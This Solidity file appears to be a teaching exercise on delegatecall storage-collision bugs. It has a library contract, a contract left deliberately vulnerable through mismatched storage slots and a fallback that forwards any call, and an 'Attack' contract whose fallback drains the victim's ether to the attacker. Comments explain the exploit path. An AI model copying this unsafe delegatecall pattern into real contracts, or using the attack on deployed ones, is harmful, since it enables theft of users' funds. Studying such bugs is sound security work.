// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "hardhat/console.sol";

contract FibonacciLib {
    uint256 public start; // slot[0]
    uint256 public calculatedFibNumber; // slot[1]

    function setStart(uint256 _start) public {
        start = _start;
    }

    function setFibonacci(uint256 n) public {
        calculatedFibNumber = fibonacci(n);
    }

    function fibonacci(uint256 n) internal returns (uint256) {
        if (n == 0) {
            return start;
        } else if (n == 1) {
            return start + 1;
        } else {
            return fibonacci(n - 1) + fibonacci(n - 2);
        }
    }
}

contract VulnToDelegateCall {
    address public fibonacciLibrary; // slot[0]
    uint256 public calculatedFibNumber; // slot[1]
    uint256 public start = 3; // slot[2] // does not match with `start` variable in FibonacciLib, where it is set as 0
    uint256 public withdrawalCounter; // slot[3]
    // Code that is executed via delegatecall will act on the state (storage) of the calling contract

    bytes4 constant fibSig = bytes4(keccak256("setFibonacci(uint256)"));

    constructor(address _fibonacciLibrary) payable {
        fibonacciLibrary = _fibonacciLibrary;
    }

    function withdraw() public {
        withdrawalCounter += 1;

        // fibonacciLibrary.delegatecall(fibSig, withdrawalCounter)

        (bool success, ) = fibonacciLibrary.delegatecall(
            abi.encodeWithSignature("setFibonacci(uint256)", withdrawalCounter)
        );
        // delegatecall preserves contract context
        // code that is executed via `delegatecall` will act on the state of the calling contract
        // setFibonacci will act on slot[1], which is the calculatedFibNumber in both libraries
        // However, the fibonacci method will cause a unexpected value as slot[0] in the calling contract is the library address

        // https://solidity-by-example.org/delegatecall/
        // When contract A executes delegatecall to contract B,
        // contract B's code is executed with contract A's storage, msg.sender and msg.value

        require(success, "DELEGATE_CALL_FAILURE");

        payable(msg.sender).transfer(calculatedFibNumber * 1 ether);
    }

    fallback() external {
        // Allows all calls to be passed to the library contract,
        // which would allow one to setStart in FibonacciLib contract,
        // Although this would not directly change the amount of ether which one can withdraw,
        // this would allow an attacker to change the state of slot[0] in the contract.
        // As the original slot[0] is an address, the withdraw function will revert
        // as the contract does not contain uint(fibonacciLibrary) amount of ether
        // An attacker can change address fibonacciLibrary to a malicious contract address,
        // Such that when a user calls the withdraw or the fallback function,
        // the malicious contract will run
        (bool success, ) = fibonacciLibrary.delegatecall(msg.data);

        require(success, "DELEGATE_CALL_FAILURE");
    }
}

contract Attack {
    uint256 storageSlot0; // corresponds to fibonacciLibrary
    uint256 storageSlot1; // corresponds to calculatedFibNumber
    address attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    fallback() external {
        storageSlot1 = 0; // set calculatedFibNumber to 0, so that ether is not sent out if withdraw is called
        payable(attacker).transfer(address(this).balance); // ether is sent to the attacker
    }
}
